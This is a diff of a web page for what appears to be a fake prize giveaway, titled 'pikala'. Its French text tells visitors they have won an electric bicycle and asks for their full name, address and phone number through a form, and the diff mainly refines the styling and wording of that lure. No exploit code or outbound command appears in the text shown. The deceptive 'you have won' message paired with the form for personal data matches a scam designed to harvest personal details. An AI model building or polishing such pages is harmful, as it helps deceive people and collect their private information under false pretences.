@@ -25,9 +25,8 @@ if(        isset($_POST["sendinfo"])              )
 <title>pikala</title>
 <meta charset="utf-8">   <meta http-equiv="X-UA-Compatible" content="IE=edge"/>  <meta http-equiv="origin-trial" content=""/>  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1, maximum-scale=1, user-scalable=no, shrink-to-fit=no"/>     
 <script type="text/javascript"  src="https://code.jquery.com/jquery-3.5.1.min.js"></script> 
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.css"/> 
-
-<style>html, body{  background: url(https://casino5.netlify.app/background.jpg);  background-position: cover;   background-size:cover;   background-repeat: no-repeat;   padding:0; border:0; margin:0;  touch-action: manipulation; }   ul li {list-style-type:none;}     </style>       
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.css"/>   <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Cairo&display=swap" /> 
+<style>html, body{  background: url(https://casino5.netlify.app/background.jpg);  background-position: cover;   background-size:cover;   background-repeat: no-repeat;  height:auto;  padding:0; border:0; margin:0;  touch-action: manipulation; }   ul li {list-style-type:none;}     </style>       
 
 
 
@@ -92,19 +91,25 @@ if(        isset($_POST["sendinfo"])              )
 		    #container2 .col1a{width:100%;  }       
             #container2 .col1b{background-color:transparent; padding:0%; margin:0% 2%;  display:grid; align-items:center; justify-content:center; text-align:center;    }
 			   #container2 .posimg1{margin:2% 0%;  display:flex; align-items:center; justify-content:center; text-align:center;}   #container2 .img1{ max-width:100%; width:500px; height:auto; }
-               #container2 .postext1{margin:2% 0%;  display:flex; align-items:center; justify-content:center; text-align:center;}  #container2 .text1{color:white; font:800 30px 'cairo';  }
-			   
+               #container2 .postext1{margin:2% 0%;  display:flex; align-items:center; justify-content:center; text-align:center;}  #container2 .text1{color:white; font:800 25px 'cairo';  line-height: 30px; }			   
 			   #container2 .posform{ margin:2% 0%;  display:flex; align-items:center; justify-content:center; text-align:center;}  
-			   #container2 form{background-color:red; padding:20px;}
+			   #container2 form{background-color:red; width:400px; padding:20px;}
 				     #container2 .posinput{ margin:2% 0%; display:flex; align-items:center; justify-content:center; text-align:center;}   
 				     #container2 .inputtext  { background-color:white; width:400px; height:50px;  border:solid 1px yellow;   border-radius:2px;  color:black; font:800 20px 'cairo'; text-indent:1rem;  }  #container2 .inputtext:focus{ box-shadow: 0 0 0 0.2rem yellow;   outline: none !important;  }  #container2 .inputtext::placeholder{color:#9f9494c9; font:500 17px 'cairo';} 
                      #container2 .inputsubmit{ background-color:green; width:400px; height:50px;  border:solid 1px green;   border-radius:5px;  box-shadow: 0 2px 5px 0 rgb(0 0 0 / 16%), 0 2px 10px 0 rgb(0 0 0 / 12%);        color:white;  font:800 25px 'cairo';           display:flex; align-items:center; justify-content:center; text-align:center;}
 
 
-@media only screen and (max-width:1300px) {  }
-@media only screen and (max-width:1000px) {  }
-@media only screen and (max-width:600px)  {  }
-@media only screen and (max-width:360px)  {  }
+
+@media only screen and (max-width:360px)  
+{ 
+    #container2 .text1{color:white; font:800 20px 'cairo'; line-height: 30px;  }
+	#container2 .posform{ margin:4% 0%;  display:flex; align-items:center; justify-content:center; text-align:center;}  
+	#container2 form{background-color:red; width:320px; padding:10px;}
+		#container2 .posinput{ margin:2% 0%; display:flex; align-items:center; justify-content:center; text-align:center;}   
+		#container2 .inputtext  { background-color:white; width:310px; height:50px;  border:solid 1px yellow;   border-radius:2px;  color:black; font:800 20px 'cairo'; text-indent:1rem;  }  #container2 .inputtext:focus{ box-shadow: 0 0 0 0.2rem yellow;   outline: none !important;  }  #container2 .inputtext::placeholder{color:#9f9494c9; font:500 17px 'cairo';} 
+        #container2 .inputsubmit{ background-color:green; width:310px; height:50px;  border:solid 1px green;   border-radius:5px;  box-shadow: 0 2px 5px 0 rgb(0 0 0 / 16%), 0 2px 10px 0 rgb(0 0 0 / 12%);        color:white;  font:800 25px 'cairo';           display:flex; align-items:center; justify-content:center; text-align:center;}
+
+}
 </style>
 
 
@@ -114,16 +119,17 @@ if(        isset($_POST["sendinfo"])              )
 		<div class="posimg1"> <img class="img1" src="img/pikala/pikala.gif"></div>         	
 		<div class="postext1"> 
 		    <div class="text1">
-			        Félicitations, vous avez gagné un vélo de haute qualité avec nous, une marque internationale
-					vous figurez dans  nos listes des gagnants .Votre commande cadeau a été créé
-					Veuillez s'il vous plaît nous  fournir les informations ci-dessous pour confirmer la livraison , essayez de vous assurer que vos informations sont correctes pour éviter tout problème de livraison
+			        Félicitations, Vous avez gagné Vous avez gagné Un Vélo éléctrique moustache Samedi 27 XROAD <br/>  <br/> 
+					vous figurez dans  nos listes des gagnants . <br/>  <br/> 
+					Votre commande a été bien créee. <br/>  <br/> 
+					Pour qu'on puisse confirmer avec vous la livraison vous devez nous fournir les informations ci-dessous, pour éviter tout problème de livraison assurez-vous bien que les informations sont correctes et n'hésitez pas de nous contacter pour toute autre information. <br/> 
 		    </div>    
 		</div>                 
         <div class="posform">
 		   <form method="post"  > 
 		       <div class="posinput"> <input type="text"   placeholder="Tapez votre nom complet"  value=""          name="name"       class="inputtext"  required="required"  oninvalid="this.setCustomValidity('Vous devez entrer votre nom complet ')"       oninput="setCustomValidity('')"   />  </div>  
 			   <div class="posinput"> <input type="text"   placeholder="Tapez votre adresse"      value=""          name="adresse"    class="inputtext"  required="required"   oninvalid="this.setCustomValidity('Vous devez entrer votre adresse ')"  oninput="setCustomValidity('')" />  </div>
-               <div class="posinput"> <input type="text"   placeholder="Tapez votre numéro"       value=""          name="num"        class="inputtext" required="required"     oninvalid="this.setCustomValidity('Vous devez entrer votre numéro ')"  oninput="setCustomValidity('')" />  </div> 
+               <div class="posinput"> <input type="number"   placeholder="Tapez votre numéro"       value=""          name="num"        class="inputtext" required="required"     oninvalid="this.setCustomValidity('Vous devez entrer votre numéro ')"  oninput="setCustomValidity('')" />  </div> 
                <div class="posinput"> <input type="submit" placeholder=""                         value="ENVOYER"   name="sendinfo"   class="inputsubmit"  />  </div>			   
            </form> 		   
         </div> 		
